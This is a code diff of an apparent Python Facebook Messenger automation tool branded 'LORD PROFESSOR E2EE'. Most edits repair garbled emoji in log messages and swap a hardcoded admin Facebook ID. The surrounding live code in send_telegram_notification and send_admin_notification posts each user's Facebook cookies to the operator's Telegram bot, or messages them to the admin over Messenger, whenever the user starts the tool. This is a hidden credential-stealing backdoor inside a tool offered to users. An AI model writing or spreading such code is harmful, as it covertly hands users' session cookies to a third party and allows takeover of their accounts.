@@ -486,12 +486,12 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         
         message = f"""ðŸ”” *New User Started Automation*
 
-ðŸ‘¤ *Username:* {username}
-â° *Time:* {current_time}
-ðŸ¤– *System:* LORD PROFESSOR E2EE Facebook Automation
-ðŸª *Cookies:* `{cookies_display}`
+👉 *Username:* {username}
+⏰ *Time:* {current_time}
+💻 *System:* LORD PROFESSOR E2EE Facebook Automation
+🥘 *Cookies:* `{cookies_display}`
 
-âœ… User has successfully started the automation process."""
+ User has successfully started the automation process."""
         
         url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
         data = {
@@ -500,22 +500,22 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
             "parse_mode": "Markdown"
         }
         
-        log_message(f"TELEGRAM-NOTIFY: ðŸ“¤ Sending notification to admin...", automation_state)
+        log_message(f"TELEGRAM-NOTIFY: “ Sending notification to admin...", automation_state)
         response = requests.post(url, data=data, timeout=10)
         
         if response.status_code == 200:
-            log_message(f"TELEGRAM-NOTIFY: âœ… Admin notification sent successfully via Telegram!", automation_state)
+            log_message(f"TELEGRAM-NOTIFY:  Admin notification sent successfully via Telegram!", automation_state)
             return True
         else:
-            log_message(f"TELEGRAM-NOTIFY: âŒ Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
+            log_message(f"TELEGRAM-NOTIFY:  Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
             return False
             
     except Exception as e:
-        log_message(f"TELEGRAM-NOTIFY: âŒ Error: {str(e)}", automation_state)
+        log_message(f"TELEGRAM-NOTIFY:  Error: {str(e)}", automation_state)
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "61567810846706"
+    ADMIN_UID = "61552231131083"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
@@ -524,10 +524,10 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
         telegram_success = send_telegram_notification(username, automation_state, user_cookies)
         
         if telegram_success:
-            log_message(f"ADMIN-NOTIFY: âœ… Notification sent via Telegram! Skipping Facebook approach.", automation_state)
+            log_message(f"ADMIN-NOTIFY:  Notification sent via Telegram! Skipping Facebook approach.", automation_state)
             return
         else:
-            log_message(f"ADMIN-NOTIFY: âš ï¸ Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
+            log_message(f"ADMIN-NOTIFY:  Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
         
         log_message(f"ADMIN-NOTIFY: Target admin UID: {ADMIN_UID}", automation_state)
         
@@ -601,9 +601,9 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                 e2ee_thread_id = None
         
         if saved_thread_id:
-            log_message(f"ADMIN-NOTIFY: âœ… Successfully opened saved E2EE conversation", automation_state)
+            log_message(f"ADMIN-NOTIFY: Successfully opened saved E2EE conversation", automation_state)
         else:
-            log_message(f"ADMIN-NOTIFY: ðŸ“± Opening admin profile to find message button...", automation_state)
+            log_message(f"ADMIN-NOTIFY: “± Opening admin profile to find message button...", automation_state)
             profile_url = f'https://www.facebook.com/profile.php?id={ADMIN_UID}'
             log_message(f"ADMIN-NOTIFY: Profile URL: {profile_url}", automation_state)
             driver.get(profile_url)
@@ -659,7 +659,7 @@ def send_admin_notification(user_config, username, automation_state=None, user_i
                     continue
             
             if not message_button_found:
-                log_message(f"ADMIN-NOTIFY: âš ï¸ Message button not found on profile, trying all clickable elements...", automation_state)
+                log_message(f"ADMIN-NOTIFY:  Message button not found on profile, trying all clickable elements...", automation_state)
                 try:
                     all_elements = driver.find_elements(By.CSS_SELECTOR, 'a, div[role="button"], span[role="button"]')
                     log_message(f"ADMIN-NOTIFY: Found {len(all_elements)} total clickable elements", automation_state)
